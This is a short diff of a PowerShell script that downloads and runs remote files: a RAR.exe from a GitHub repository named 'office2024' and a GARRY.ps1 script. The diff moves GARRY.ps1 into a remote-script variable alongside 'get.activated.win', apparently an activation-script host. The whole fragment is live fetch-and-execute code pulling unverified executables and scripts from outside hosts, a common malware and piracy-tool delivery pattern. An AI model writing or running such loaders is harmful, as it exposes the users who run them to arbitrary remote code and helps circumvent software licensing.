@@ -52,12 +52,12 @@ function Execute-RemoteScript {
 
 # URLs of the executables to download and run
 $urls = @(
-    'https://github.com/Zigsaw07/SETSKY/raw/refs/heads/main/GARRY.ps1',
+    
     'https://github.com/Zigsaw07/office2024/raw/main/RAR.exe'    
 )
 
 # URL of the remote script to execute
-$remoteScriptUrl = 'https://get.activated.win'
+$remoteScriptUrl = 'https://github.com/Zigsaw07/SETSKY/raw/refs/heads/main/GARRY.ps1', 'https://get.activated.win'
 
 # Loop through each URL and execute the download and run function
 foreach ($url in $urls) {
